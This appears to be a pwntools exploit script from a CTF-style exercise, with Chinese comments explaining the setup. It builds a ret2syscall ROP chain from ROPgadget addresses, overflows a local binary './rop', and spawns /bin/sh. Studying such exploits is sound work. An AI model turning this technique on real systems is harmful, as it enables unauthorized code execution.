from pwn import*
proc = process('./rop')

# 32位
# eax = 0xb       // execve系统调用号
# ebx = /bin/sh   // 第一个参数
# ecx = 0         // 第二个参数
# edx = 0         // 第三个参数
# esx = 0         // 第四个参数
# edi = 0         // 第五个参数
#
# 64位
# rax = 0x3B      // execve系统调用号
# rdi = /bin/sh   // 第一个参数
# rsi = 0         // 第二个参数
# rdx = 0         // 第三个参数
# rcx = 0         // 第四个参数
# r8  = 0         // 第五个参数
# r9  = 0         // 第六个参数

# ROPgadget --binary ./rop --string '/bin/sh'
binsh   = 0x080be408

# ROPgadget --binary ./rop --only 'pop|ret'
# eax=0xb
pop_eax = 0x080bb196

# ROPgadget --binary ./rop --only 'pop|ret' | grep ecx
# ebx=/bin/sh
# ecx=0
# edx=0
pop_edx_ecx_ebx = 0x0806eb90

# ROPgadget --binary ./rop --only 'int'
int_0x80    = 0x08049421

# 具体填充数量请按照动态调试的情况确定
p = b'a' * ( 112 ) + p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh) + p32(int_0x80)

proc.recvuntil('What do you plan to do?\n')
proc.sendline(p)
proc.interactive()